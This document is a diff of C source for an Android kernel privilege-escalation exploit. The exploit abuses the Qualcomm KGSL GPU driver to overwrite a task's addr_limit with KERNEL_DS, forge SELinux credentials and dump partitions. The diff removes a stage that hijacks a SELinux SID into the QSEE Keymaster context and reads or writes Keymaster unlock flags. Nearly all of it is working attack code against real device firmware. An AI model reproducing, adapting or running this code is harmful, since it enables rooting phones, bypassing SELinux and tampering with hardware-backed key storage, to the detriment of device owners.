@@ -28,7 +28,6 @@
 #include <linux/futex.h>
 #include <sys/syscall.h>
 #include <time.h>
-#include "keymaster_device_state.h"
 #include "ko_loader.h"
 #include "selinux_handoff.h"
 #include "target_profile.h"
@@ -73,11 +72,9 @@
 #define MAX_RACERS 4
 #define SCAN_MAX_PAGES 65540
 #define SCAN_FIRST_PAGE 1
-#define TASK_ADDR_LIMIT_BURST_REPEATS 16384
 #define KM_DUMP_BUFFER_SIZE 0x100000
 #define IB_SIZE 0x1000000ULL
-#define KM_BUFFER_SIZE  0x2000
-#define KM_BACKUP_PATH  "/data/local/tmp/km_device_state.before.bin"
+
 #define KERNEL_DS       UINT64_MAX
 #define CRED_IDS_LEN    0x20
 #define CRED_CAPS_LEN   0x18
@@ -109,8 +106,6 @@ struct ctrl {
     volatile int error;
     volatile int root_done;
     volatile int root_stage;
-    volatile int qsee_done;
-    volatile int qsee_status;
     volatile int daemon_abort;
     volatile int sec_probe_cand;
     volatile int sec_probe_ready;
@@ -119,7 +114,6 @@ struct ctrl {
     volatile uint64_t sec_fake_addr;   /* kernel VA of the forged security struct */
     char sec_ctx[128];
     int sec_errno[12];
-    struct selinux_handoff_state handoff;
 };
 struct found {
     uint64_t page;
@@ -136,8 +130,6 @@ static int g_race_delay_us = 30;
 static volatile int race_go;
 static int verbose = 1;
 static const struct target_profile *g_target;
-static unsigned char *g_km_current_buffer;
-static unsigned char *g_km_expected_buffer;
 #define SEC_LOG_SIZE (64 * 1024)
 static char *g_sec_log;
 #define SEC_DUMP_SIZE (48u << 20)
@@ -150,7 +142,6 @@ struct sec_dump_hdr {
 };
 static unsigned char *g_dump_buf;
 static struct sec_dump_hdr *g_dump_hdr;
-static int g_km_write_mode;
 
 /* GPT parsing so a raw disk node (root/gpt block device) can stand in for
  * the per-partition by-name nodes when only the raw node is permitted. */
@@ -662,106 +653,6 @@ static void move_selected_child_for_credential_read(void) {
             return;
         }
     }
-}
-
-static int run_kmunlock_tool(void) {
-    const char *mode = getenv("KM_UNLOCK_MODE");
-    if (!mode || (strcmp(mode, "read") && strcmp(mode, "write"))) {
-        errno = EINVAL;
-        return 125;
-    }
-    int write_mode = !strcmp(mode, "write");
-    if (g_km_current_buffer) {
-        char address[32];
-        snprintf(address, sizeof(address), "0x%llx",
-                 (unsigned long long)(uintptr_t)g_km_current_buffer);
-        if (setenv("KM_DUMP_BUFFER", address, 1) < 0) return 125;
-    }
-    if (setenv("KM_DUMP", KM_BACKUP_PATH, 1) < 0) return 125;
-    if (write_mode) {
-        char address[32];
-        if (!g_km_expected_buffer) return 125;
-        snprintf(address, sizeof(address), "0x%llx",
-                 (unsigned long long)(uintptr_t)g_km_expected_buffer);
-        if (setenv("KM_EXPECTED_BUFFER", address, 1) < 0 ||
-            setenv("KM_DUMP_PREBACKED", "1", 1) < 0)
-            return 125;
-    }
-
-    char *write_argv[] = { (char *)"keymaster", (char *)"--write", NULL };
-    char *read_argv[] = { (char *)"keymaster", NULL };
-    return keymaster_device_state_main(
-        write_mode ? 2 : 1, write_mode ? write_argv : read_argv);
-}
-
-static int read_exact_fd(int fd, void *buffer, size_t length)
-{
-    unsigned char *p = buffer;
-    size_t done = 0;
-    while (done < length) {
-        ssize_t n = read(fd, p + done, length - done);
-        if (n < 0 && errno == EINTR) continue;
-        if (n <= 0) {
-            if (n == 0) errno = EIO;
-            return -1;
-        }
-        done += (size_t)n;
-    }
-    return 0;
-}
-
-static int load_km_backup(void)
-{
-    struct stat st;
-    int fd = open(KM_BACKUP_PATH, O_RDONLY | O_CLOEXEC);
-    if (fd < 0) return -1;
-    if (fstat(fd, &st) < 0) {
-        int saved_errno = errno;
-        close(fd);
-        errno = saved_errno;
-        return -1;
-    }
-    if (st.st_size != KM_BUFFER_SIZE) {
-        close(fd);
-        errno = EINVAL;
-        return -1;
-    }
-    if (read_exact_fd(fd, g_km_expected_buffer, KM_BUFFER_SIZE) < 0) {
-        int saved_errno = errno;
-        close(fd);
-        errno = saved_errno;
-        return -1;
-    }
-    close(fd);
-    if (keymaster_device_state_validate(g_km_expected_buffer,
-                                        KM_BUFFER_SIZE, 0, 0) < 0)
-        return -1;
-    return 0;
-}
-
-static int initialize_km_buffers(int write_mode)
-{
-    g_km_current_buffer = mmap(NULL, KM_BUFFER_SIZE,
-                               PROT_READ | PROT_WRITE,
-                               MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-    if (g_km_current_buffer == MAP_FAILED) {
-        g_km_current_buffer = NULL;
-        return -1;
-    }
-    memset(g_km_current_buffer, 0, KM_BUFFER_SIZE);
-    if (!write_mode) return 0;
-
-    g_km_expected_buffer = mmap(NULL, KM_BUFFER_SIZE,
-                                PROT_READ | PROT_WRITE,
-                                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-    if (g_km_expected_buffer == MAP_FAILED) {
-        g_km_expected_buffer = NULL;
-        return -1;
-    }
-    memset(g_km_expected_buffer, 0, KM_BUFFER_SIZE);
-    if (load_km_backup() < 0) return -1;
-    g_km_write_mode = 1;
-    return 0;
 }
 
 /*
@@ -1289,61 +1180,7 @@ static void child_loop(int idx, pid_t parent_pid, int kgsl_fd) {
             __sync_synchronize();
             ctrls[idx].sec_probe_result = 0;
         }
-        if (getenv("KM_UNLOCK_MODE")) {
-            ctrls[idx].qsee_status = run_kmunlock_tool();
-            fflush(NULL);
-            __sync_synchronize();
-            ctrls[idx].qsee_done = 1;
-            futex_wake_int(&ctrls[idx].qsee_done);
-        }
         for (;;) pause();
-    }
-    if (getenv("KM_UNLOCK_MODE")) {
-        struct selinux_handoff_state *handoff = &ctrls[idx].handoff;
-        if (!g_target->qsee_context ||
-            selinux_handoff_verify_context("u:r:shell:s0") < 0) {
-            handoff->status = errno ? errno : EACCES;
-            ctrls[idx].qsee_status = handoff->status;
-            ctrls[idx].qsee_done = 1;
-            __sync_synchronize();
-            _exit(1);
-        }
-        handoff->ready = 1;
-        __sync_synchronize();
-        while (!handoff->start && !ctrls[idx].daemon_abort) {
-            __sync_synchronize();
-            __asm__ volatile("yield" ::: "memory");
-        }
-        if (ctrls[idx].daemon_abort) {
-            ctrls[idx].qsee_status = ECANCELED;
-            ctrls[idx].qsee_done = 1;
-            __sync_synchronize();
-            _exit(1);
-        }
-
-        int handoff_rc = selinux_handoff_patch_child(
-            handoff, g_target, &g_allowed_cpus, g_park_cpu);
-        handoff->status = handoff_rc == 0 ? 0 : (errno ? errno : EIO);
-        __sync_synchronize();
-        handoff->done = 1;
-        __sync_synchronize();
-        while (!handoff->resume && !ctrls[idx].daemon_abort) {
-            __sync_synchronize();
-            __asm__ volatile("yield" ::: "memory");
-        }
-        if (ctrls[idx].daemon_abort) {
-            ctrls[idx].qsee_status = ECANCELED;
-        } else if (handoff->status != 0) {
-            ctrls[idx].qsee_status = handoff->status;
-        } else if (selinux_handoff_verify_context(g_target->qsee_context) < 0) {
-            ctrls[idx].qsee_status = errno ? errno : EACCES;
-        } else {
-            ctrls[idx].qsee_status = run_kmunlock_tool();
-        }
-        __sync_synchronize();
-        ctrls[idx].qsee_done = 1;
-        futex_wake_int(&ctrls[idx].qsee_done);
-        _exit(ctrls[idx].qsee_status == 0 ? 0 : 1);
     }
     if (ctrls[idx].daemon_abort) _exit(127);
 
@@ -2055,105 +1892,6 @@ static int wait_for_root_credentials(int idx, int timeout_ms) {
     return -1;
 }
 
-static int wait_for_qsee(int idx, int timeout_ms) {
-    for (int elapsed = 0; elapsed < timeout_ms; elapsed += 10) {
-        __sync_synchronize();
-        if (ctrls[idx].qsee_done) return ctrls[idx].qsee_status;
-        usleep(10000);
-    }
-    errno = ETIMEDOUT;
-    return -1;
-}
-
-static int wait_for_handoff(int idx, volatile int *field, int timeout_ms)
-{
-    for (int elapsed = 0; elapsed < timeout_ms; elapsed += 10) {
-        __sync_synchronize();
-        if (*field) return 0;
-        if (ctrls[idx].qsee_done) {
-            errno = ctrls[idx].qsee_status ? ctrls[idx].qsee_status : EIO;
-            return -1;
-        }
-        usleep(10000);
-    }
-    errno = ETIMEDOUT;
-    return -1;
-}
-
-static int write_task_addr_limit(int fd, unsigned ctx, unsigned ib_id,
-                                 uint64_t ib_gpu, void *ib_vma,
-                                 unsigned dump_id, uint64_t dump_gpu,
-                                 void *dump_vma, uint64_t task_alias,
-                                 const struct target_profile *profile,
-                                 uint64_t value)
-{
-    uint32_t words[2], observed[2] = {0, 0};
-    split64(value, &words[0], &words[1]);
-    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
-                        task_alias + profile->task_addr_limit,
-                        words, 2) < 0 ||
-        gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
-                       dump_id, dump_gpu, dump_vma,
-                       task_alias + profile->task_addr_limit,
-                       observed, 2) < 0)
-        return -1;
-    if (observed[0] != words[0] || observed[1] != words[1]) {
-        errno = EIO;
-        return -1;
-    }
-    return 0;
-}
-
-static int abort_handoff_io(struct selinux_handoff_state *handoff, int error)
-{
-    if (!error) error = EIO;
-    handoff->status = error;
-    handoff->abort_requested = 1;
-    handoff->candidate_result = -error;
-    handoff->candidate_ack = 1;
-    __sync_synchronize();
-    futex_wake_int(&handoff->candidate_ack);
-    futex_wake_int(&handoff->io_active);
-    futex_wake_int(&handoff->io_released);
-    errno = error;
-    return -1;
-}
-
-static int gpu_write_task_addr_limit_burst(
-        int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
-        uint64_t ib_bytes, uint64_t task_alias,
-        const struct target_profile *profile, unsigned repeats)
-{
-    size_t required_words = 2 + (size_t)repeats * 12;
-    if (!repeats || required_words * sizeof(uint32_t) > ib_bytes) {
-        errno = EINVAL;
-        return -1;
-    }
-
-    uint64_t address = task_alias + profile->task_addr_limit;
-    uint32_t addr_lo, addr_hi, value_lo, value_hi;
-    split64(address, &addr_lo, &addr_hi);
-    split64(KERNEL_DS, &value_lo, &value_hi);
-    uint32_t *cmd = ib_vma;
-    size_t dw = 0;
-    cmd[dw++] = pkt(CP_NOP, 0);
-    for (unsigned i = 0; i < repeats; i++) {
-        cmd[dw++] = pkt(CP_NOP, 0);
-        cmd[dw++] = pkt(CP_MEM_WRITE, 3);
-        cmd[dw++] = addr_lo;
-        cmd[dw++] = addr_hi;
-        cmd[dw++] = value_lo;
-        cmd[dw++] = pkt(CP_NOP, 0);
-        cmd[dw++] = pkt(CP_NOP, 0);
-        cmd[dw++] = pkt(CP_MEM_WRITE, 3);
-        cmd[dw++] = addr_lo + 4;
-        cmd[dw++] = addr_hi;
-        cmd[dw++] = value_hi;
-        cmd[dw++] = pkt(CP_NOP, 0);
-    }
-    return kgsl_submit(fd, ctx, ib_id, ib_gpu, ib_vma, dw * sizeof(uint32_t));
-}
-
 static int read_proc_task_state(pid_t pid, char *state)
 {
     char path[64], buffer[512];
@@ -2182,170 +1920,6 @@ static int read_proc_task_state(pid_t pid, char *state)
     }
     *state = end[2];
     return 0;
-}
-
-static int service_sid_handoff(
-        int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
-        uint64_t ib_bytes, unsigned dump_id, uint64_t dump_gpu,
-        void *dump_vma, pid_t child_pid, uint64_t task_alias,
-        const struct target_profile *profile,
-        struct selinux_handoff_state *handoff, int timeout_ms)
-{
-    unsigned serviced = 0, bursts = 0;
-    int migration_warning_reported = 0;
-    for (int elapsed = 0; elapsed < timeout_ms; elapsed++) {
-        __sync_synchronize();
-        if (handoff->done)
-            return 0;
-
-        if (handoff->candidate_done && !handoff->candidate_ack) {
-            if (!handoff->helper_sent) {
-                usleep(1000);
-                continue;
-            }
-            if (handoff->helper_status != 0) {
-                int error = handoff->helper_status > 0 ?
-                    handoff->helper_status : EIO;
-                return abort_handoff_io(handoff, error);
-            }
-            if (handoff->io_status != 0) {
-                int error = handoff->io_status > 0 ?
-                    handoff->io_status : EIO;
-                uint32_t addr_limit_words[2] = {0};
-                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma,
-                                   ib_bytes, dump_id, dump_gpu, dump_vma,
-                                   task_alias + profile->task_addr_limit,
-                                   addr_limit_words, 2) == 0) {
-                    uint64_t addr_limit =
-                        ((uint64_t)addr_limit_words[1] << 32) |
-                        addr_limit_words[0];
-                    fprintf(stderr,
-                            "[-] recvfrom failed: %s; child addr_limit=%016llx "
-                            "migration_status=%d helper_status=%d\n",
-                            strerror(error),
-                            (unsigned long long)addr_limit,
-                            handoff->migration_status,
-                            handoff->helper_status);
-                } else {
-                    fprintf(stderr,
-                            "[-] recvfrom failed: %s; addr_limit readback: %s\n",
-                            strerror(error), strerror(errno));
-                }
-                return abort_handoff_io(handoff, error);
-            }
-
-            int restored = 0;
-            for (int attempt = 0; attempt < 20; attempt++) {
-                if (write_task_addr_limit(fd, ctx, ib_id, ib_gpu, ib_vma,
-                                          dump_id, dump_gpu, dump_vma,
-                                          task_alias, profile,
-                                          profile->user_ds) == 0) {
-                    restored = 1;
-                    break;
-                }
-                usleep(10000);
-            }
-            if (!restored) {
-                int error = errno ? errno : EIO;
-                return abort_handoff_io(handoff, error);
-            }
-
-            int matched = 0;
-            if (handoff->io_operation == SELINUX_HANDOFF_IO_PROBE) {
-                matched = selinux_handoff_pid_has_attribute_context(
-                    child_pid, "fscreate", profile->qsee_context) == 0;
-                handoff->candidate_result = matched ? 1 : 0;
-                if (matched) {
-                    handoff->target_sid = handoff->io_candidate_sid;
-                    printf("[+] Keymaster context maps to SID %u\n",
-                           handoff->target_sid);
-                } else if (handoff->io_candidate_sid % 128 == 0) {
-                    printf("[*] SELinux SID probes completed: %u/%u\n",
-                           handoff->io_candidate_sid, handoff->sid_limit);
-                }
-            } else if (handoff->io_operation == SELINUX_HANDOFF_IO_CLEAR) {
-                if (selinux_handoff_pid_has_attribute_context(
-                        child_pid, "fscreate", "") < 0) {
-                    int error = errno ? errno : ESTALE;
-                    handoff->candidate_result = -error;
-                    handoff->status = error;
-                    handoff->abort_requested = 1;
-                } else {
-                    handoff->candidate_result = 0;
-                }
-            } else if (handoff->io_operation == SELINUX_HANDOFF_IO_ACTIVATE) {
-                if (!profile->qsee_context ||
-                    selinux_handoff_pid_has_context(
-                        child_pid, profile->qsee_context) < 0) {
-                    int error = errno ? errno : ESTALE;
-                    handoff->candidate_result = -error;
-                    handoff->status = error;
-                    handoff->abort_requested = 1;
-                } else {
-                    handoff->candidate_result = 0;
-                }
-            } else {
-                handoff->candidate_result = -EPROTO;
-                handoff->status = EPROTO;
-                handoff->abort_requested = 1;
-            }
-            __sync_synchronize();
-            handoff->candidate_ack = 1;
-            futex_wake_int(&handoff->candidate_ack);
-            if (handoff->candidate_result < 0) {
-                errno = -handoff->candidate_result;
-                return -1;
-            }
-            serviced++;
-            if (serviced == 1 || serviced % 64 == 0)
-                printf("[*] serviced SID handoffs: %u\n", serviced);
-            continue;
-        }
-
-        if (!handoff->io_active || handoff->io_released) {
-            usleep(1000);
-            continue;
-        }
-
-        char task_state = '\0';
-        if (read_proc_task_state(child_pid, &task_state) < 0) {
-            return abort_handoff_io(handoff, errno ? errno : EIO);
-        }
-        if (task_state == 'S' || task_state == 'D') {
-            if (!handoff->migration_done) {
-                usleep(1000);
-                continue;
-            }
-            if (handoff->migration_status != 0 &&
-                !migration_warning_reported) {
-                fprintf(stderr,
-                        "[!] helper affinity update failed: %s\n",
-                        strerror(handoff->migration_status));
-                migration_warning_reported = 1;
-            }
-            if (write_task_addr_limit(fd, ctx, ib_id, ib_gpu, ib_vma,
-                                      dump_id, dump_gpu, dump_vma,
-                                      task_alias, profile, KERNEL_DS) < 0) {
-                return abort_handoff_io(handoff, errno ? errno : EIO);
-            }
-            __sync_synchronize();
-            handoff->io_released = 1;
-            __sync_synchronize();
-            futex_wake_int(&handoff->io_released);
-            continue;
-        }
-
-        if (gpu_write_task_addr_limit_burst(
-                fd, ctx, ib_id, ib_gpu, ib_vma, ib_bytes, task_alias,
-                profile, TASK_ADDR_LIMIT_BURST_REPEATS) < 0) {
-            return abort_handoff_io(handoff, errno ? errno : EIO);
-        }
-        bursts++;
-        if (bursts == 1 || bursts % 64 == 0)
-            printf("[*] addr_limit race bursts submitted: %u\n", bursts);
-    }
-
-    return abort_handoff_io(handoff, ETIMEDOUT);
 }
 
 static int pin_parent_for_spray(void) {
@@ -2546,36 +2120,8 @@ int main(int argc, char **argv) {
                 g_target->model);
         return 2;
     }
-    const char *km_mode = getenv("KM_UNLOCK_MODE");
-    int run_kmunlock = km_mode && *km_mode;
     int sec_sid_mode = getenv("SEC_SID") != NULL;
     int sec_perm_mode = env_flag("SEC_PERMISSIVE", 1);
-    if (run_kmunlock && strcmp(km_mode, "read") && strcmp(km_mode, "write")) {
-        fprintf(stderr, "[-] KM_UNLOCK_MODE must be read or write\n");
-        return 2;
-    }
-
-    pid_t qsee_pid = -1;
-    if (run_kmunlock) {
-        if (!g_target->qsee_context || !g_target->cred_security) {
-            fprintf(stderr, "[-] no verified QSEE handoff profile for %s\n",
-                    g_target->model);
-            return 2;
-        }
-        qsee_pid = selinux_handoff_find_pid(g_target->qsee_context);
-        if (qsee_pid < 0) {
-            perror("find QSEE-authorized Keymaster process");
-            return 1;
-        }
-        printf("[*] Keymaster domain pid=%d context=%s\n",
-               qsee_pid, g_target->qsee_context);
-        if (initialize_km_buffers(strcmp(km_mode, "write") == 0) < 0) {
-            perror(strcmp(km_mode, "write") == 0 ?
-                   "load saved Keymaster pre-state" :
-                   "allocate Keymaster result buffer");
-            return 1;
-        }
-    }
     long configured = 0;
     int children_set = 0, pressure_set = 0;
     int env_status = read_env_long("KGSL_CHILDREN", 512, MAX_CHILDREN,
@@ -2826,32 +2372,6 @@ int main(int argc, char **argv) {
         }
     }
 
-    uint64_t child_security = 0;
-    if (run_kmunlock) {
-        uint32_t security_words[2] = {0, 0};
-        if (!selected_cred_alias ||
-            gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
-                           dump_id, dump_gpu, dump_vma,
-                           selected_cred_alias + g_target->cred_security,
-                           security_words, 2) < 0) {
-            perror("read selected child handoff state");
-            kill_children_except(-1);
-            return 1;
-        }
-        child_security = ((uint64_t)security_words[1] << 32) |
-                         security_words[0];
-        if ((child_security & 0xffff000000000000ULL) !=
-                0xffff000000000000ULL || (child_security & 7ULL)) {
-            fprintf(stderr,
-                    "[-] invalid handoff security pointer=%016llx\n",
-                    (unsigned long long)child_security);
-            kill_children_except(-1);
-            return 1;
-        }
-        printf("[*] child SELinux security object=%016llx\n",
-               (unsigned long long)child_security);
-    }
-
     printf("[*] reaping spray children after root verification\n");
     kill_children_except(root_child.idx);
     if (sec_sid_mode && getenv("SEC_WRITE") && g_dump_buf && g_dump_hdr) {
@@ -2888,7 +2408,6 @@ int main(int argc, char **argv) {
                     "[-] permissive hijack not armed; child will resume"
                     " normally\n");
     }
-    ctrls[root_child.idx].handoff.current_security = child_security;
     ctrls[root_child.idx].root_done = 0;
     ctrls[root_child.idx].error = 0;
     ctrls[root_child.idx].action = 1;
@@ -3048,151 +2567,6 @@ int main(int argc, char **argv) {
             if (mf >= 0) close(mf);
             printf("[+] dump written (%d partitions)\n", g_dump_hdr->count);
         }
-    }
-
-    if (run_kmunlock) {
-        struct selinux_handoff_state *handoff =
-            &ctrls[root_child.idx].handoff;
-        int qsee_status = 1;
-        if (sec_sid_mode) {
-            /* The child already has SID 1 and calls the QSEECom client
-             * itself; no handoff is involved. */
-            int st = wait_for_qsee(root_child.idx, 300000);
-            qsee_status = st < 0 ? (errno ? errno : ETIMEDOUT) : st;
-            if (g_sec_log && *g_sec_log)
-                printf("[child log]\n%s\n", g_sec_log);
-            if (g_dump_hdr && g_dump_hdr->done) {
-                int dfd = open("/data/local/tmp/dump_all.bin",
-                               O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                if (dfd >= 0) {
-                    (void)!write(dfd, g_dump_buf, SEC_DUMP_SIZE);
-                    close(dfd);
-                }
-                int mf = open("/data/local/tmp/dump_all.txt",
-                              O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                if (mf >= 0) {
-                    char line[128];
-                    for (int i = 0; i < g_dump_hdr->count; i++) {
-                        int n = snprintf(line, sizeof line, "%s %lld %lld\n",
-                                         g_dump_hdr->ent[i].name,
-                                         g_dump_hdr->ent[i].offset,
-                                         g_dump_hdr->ent[i].size);
-                        if (n > 0) (void)!write(mf, line, (size_t)n);
-                    }
-                    close(mf);
-                }
-                printf("[+] dump written (%d partitions)\n", g_dump_hdr->count);
-            }
-            if (qsee_status)
-                fprintf(stderr, "[-] SEC_SID Keymaster stage status=%d\n",
-                        qsee_status);
-            else
-                printf("[+] SEC_SID Keymaster stage returned success\n");
-            goto km_stage_done;
-        }
-        int child_ready = wait_for_handoff(root_child.idx, &handoff->ready,
-                                           10000) == 0;
-        if (!child_ready) {
-            qsee_status = ctrls[root_child.idx].qsee_status;
-            if (!qsee_status) qsee_status = errno ? errno : EIO;
-            fprintf(stderr, "[-] child could not enter the SID handoff\n");
-        } else if (selinux_handoff_pid_has_context(
-                       qsee_pid, g_target->qsee_context) < 0) {
-            qsee_status = errno ? errno : ESTALE;
-            ctrls[root_child.idx].daemon_abort = 1;
-            fprintf(stderr, "[-] Keymaster process identity changed before SID handoff\n");
-        } else if (selinux_handoff_pid_has_attribute_context(
-                       root_child.pid, "fscreate", "") < 0) {
-            qsee_status = errno ? errno : EACCES;
-            ctrls[root_child.idx].daemon_abort = 1;
-            fprintf(stderr, "[-] cannot inspect the child fscreate SID\n");
-        } else {
-            handoff->start = 1;
-            __sync_synchronize();
-            if (service_sid_handoff(
-                    fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
-                    dump_id, dump_gpu, dump_vma, root_child.pid,
-                    root_child.page, g_target, handoff, 600000) < 0) {
-                qsee_status = errno ? errno : ETIMEDOUT;
-                handoff->abort_requested = 1;
-                ctrls[root_child.idx].daemon_abort = 1;
-                fprintf(stderr, "[-] SID handoff I/O service failed\n");
-            } else {
-                qsee_status = handoff->status;
-            }
-            if (qsee_status != 0 && handoff->done) {
-                fprintf(stderr,
-                        "[-] SID handoff stage=%d probe=%u sid=%u\n",
-                        handoff->stage, handoff->probe_index,
-                        handoff->io_candidate_sid);
-            }
-
-            if (qsee_status == 0 &&
-                selinux_handoff_pid_has_context(
-                    qsee_pid, g_target->qsee_context) < 0) {
-                qsee_status = errno ? errno : ESTALE;
-                handoff->status = qsee_status;
-                __sync_synchronize();
-                fprintf(stderr, "[-] Keymaster process identity changed during SID handoff\n");
-            }
-
-            int restored = 0;
-            for (int attempt = 0; attempt < 20; attempt++) {
-                if (write_task_addr_limit(fd, ctx, ib_id, ib_gpu, ib_vma,
-                                          dump_id, dump_gpu, dump_vma,
-                                          root_child.page, g_target,
-                                          g_target->user_ds) == 0) {
-                    restored = 1;
-                    break;
-                }
-                usleep(10000);
-            }
-            if (!restored) {
-                qsee_status = errno ? errno : EIO;
-                ctrls[root_child.idx].daemon_abort = 1;
-                fprintf(stderr, "[-] could not restore the child's USER_DS address limit\n");
-            }
-            handoff->resume = 1;
-            __sync_synchronize();
-
-            if (restored && qsee_status == 0) {
-                qsee_status = wait_for_qsee(root_child.idx, 180000);
-                if (qsee_status < 0) qsee_status = errno ? errno : ETIMEDOUT;
-            }
-        }
-
-    km_stage_done:
-        if (qsee_status == 0 && !g_km_write_mode) {
-            if (keymaster_device_state_save_backup(
-                    KM_BACKUP_PATH, g_km_current_buffer,
-                    KM_BUFFER_SIZE) < 0) {
-                perror("save verified Keymaster pre-state");
-                qsee_status = errno ? errno : EIO;
-            } else {
-                printf("[+] read-only Keymaster state saved before any write\n");
-            }
-        } else if (qsee_status == 0 && g_km_write_mode) {
-            if (keymaster_device_state_validate(g_km_current_buffer,
-                                                KM_BUFFER_SIZE, 1, 1) < 0) {
-                fprintf(stderr, "[-] Keymaster unlock flags did not verify\n");
-                qsee_status = errno ? errno : EIO;
-            } else {
-                printf("[+] Keymaster unlock flags verified as 1/1\n");
-            }
-        }
-
-        if (qsee_status == 0)
-            printf("[+] Keymaster %s probe completed\n", km_mode);
-        else
-            fprintf(stderr, "[-] Keymaster %s probe failed (status=%d)\n",
-                    km_mode, qsee_status);
-
-        kill_children_except(-1);
-        if (g_km_current_buffer)
-            munmap(g_km_current_buffer, KM_BUFFER_SIZE);
-        if (g_km_expected_buffer)
-            munmap(g_km_expected_buffer, KM_BUFFER_SIZE);
-        return qsee_status == 0 ? 0 : 1;
     }
 
     int status = 0;
